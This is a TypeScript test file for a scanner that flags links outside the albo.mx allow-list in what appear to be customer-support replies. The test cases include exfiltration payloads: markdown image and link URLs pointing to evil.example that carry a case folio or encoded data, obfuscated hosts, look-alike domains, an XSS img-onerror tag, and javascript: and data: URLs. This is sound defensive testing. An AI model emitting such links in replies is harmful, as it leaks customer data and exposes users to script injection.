import { describe, expect, it } from 'vitest';

import {
  ALLOWED_REPLY_HOSTS,
  hasLinkOutsideAllowList,
} from './link-scanner.js';

const scan = (text: string): boolean =>
  hasLinkOutsideAllowList(text, ALLOWED_REPLY_HOSTS);

describe('hasLinkOutsideAllowList (02 G5 LINK_IN_REPLY)', () => {
  it.each([
    'Hola Ana, registramos tu aclaración con folio AC-7KQ2-M9XD.',
    'Te responderemos por escrito a más tardar el 9 de octubre.',
    'Puedes consultar el estado en https://albo.mx/ayuda/aclaraciones.',
    'Escríbenos desde la app o en www.albo.mx',
    'Revisa [nuestra guía](https://ayuda.albo.mx/spei).',
    'El monto fue de $1,250.50 y la operación quedó liquidada.',
    'Por ej. una transferencia SPEI tarda segundos; S.A. de C.V.',
    'Listo. Saludos.',
  ])('passes a reply with no link outside albo: %s', (text) => {
    expect(scan(text)).toBe(false);
  });

  it.each([
    ['a markdown link', 'Detalles [aquí](https://evil.example/collect?d=abc)'],
    ['a markdown image', '![](https://evil.example/?d=AC-7KQ2-M9XD)'],
    ['a raw url', 'Ve a https://evil.example/collect'],
    ['an uppercase url', 'HTTPS://EVIL.EXAMPLE/COLLECT'],
    ['a subdomain smuggling data', 'https://c2VjcmV0.evil.example'],
    ['a root-dot host', 'https://evil.example./collect'],
    ['a percent-encoded dot', '[x](https://evil%2eexample/collect)'],
    ['a decimal character reference', '[x](https://evil&#46;example/collect)'],
    ['a hex character reference', '[x](https://evil&#x2E;example/collect)'],
    ['a named character reference', '[x](https://evil&period;example/collect)'],
    [
      'a reference-style definition',
      'ver [x][1]\n\n[1]: //evil.example/collect',
    ],
    ['a protocol-relative destination', '[x](//evil.example)'],
    ['an angle-wrapped destination', '[x](<//evil.example>)'],
    ['an angle-bracket autolink', '<https://evil.example>'],
    ['a www autolink', 'Detalles en www.evil.example'],
    ['an email autolink', 'mándalo a datos@evil.example'],
    ['a host that only starts with albo.mx', 'https://albo.mx.evil.com/ayuda'],
    ['a look-alike of albo.mx', 'https://albo-mx.com/ayuda'],
    ['a bare domain', 'Entra a evil.ly/premio'],
    ['a full-width dot', 'Entra a https://evil\uFF0Eexample'],
    ['raw html', '<a href="https://albo.mx">ayuda</a>'],
    ['an html image', '<img src=x onerror=alert(1)>'],
    ['a javascript url', '[x](javascript:alert(1))'],
    ['a data url', '[x](data:text/html,hola)'],
  ])('flags %s', (_, text) => {
    expect(scan(text)).toBe(true);
  });

  it('survives out-of-range character references instead of throwing', () => {
    expect(scan('[a](https://x&#1114112;.example)')).toBe(true);
    expect(scan('Hola &#x110000; adiós')).toBe(false);
  });
});
